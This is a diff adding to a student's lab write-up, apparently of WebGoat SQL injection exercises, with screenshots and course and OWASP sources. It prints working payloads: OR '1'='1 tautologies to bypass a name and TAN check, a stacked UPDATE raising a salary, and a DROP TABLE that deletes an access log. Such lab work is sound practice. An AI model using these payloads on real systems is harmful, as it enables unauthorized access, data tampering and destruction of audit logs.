@@ -101,5 +101,24 @@
  
  <img width="375" alt="wg8" src="https://user-images.githubusercontent.com/102954934/215627941-376a985e-5ca2-4a19-ae9a-a6fe16917c16.png">
  
+ Inputing in the  fields (Employee Name and Authentication TAN)
+ (name) Tan' OR '1'='1  and (Authentication TAN) 3NJ92A' OR '1'='1 . Did a lot of googling to figure this out.
  
+ <img width="755" alt="w9" src="https://user-images.githubusercontent.com/102954934/215629146-1c148922-8596-4035-ba84-71f1d9a1a99d.png">
+ 
+ `3SL99A';UPDATE Employees SET salary=100000 WHERE last_name='Smith' AND auth_tan='3SL99A';--`
+ This one was just raising the salary so updatind the table worked.
+ 
+ <img width="733" alt="wg10" src="https://user-images.githubusercontent.com/102954934/215629431-2533240d-b552-4aa0-b036-31d4e8705c15.png">
+ 
+ `'; DROP TABLE access_log;--`
+ Just had to drop table.
 
+## Sources
+  - https://terokarvinen.com/2021/data-security-2022p3-ict4tf022-3008/#h2
+  - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
+  - https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://darknetdiaries.com/episode/6/
+  - https://stackoverflow.com/questions/46932389/sql-query-show-name-with-all-vowels
+  - https://www.cve.org/Media/News/item/blog/2023/01/10/Why-Red-Hat-Became-Root
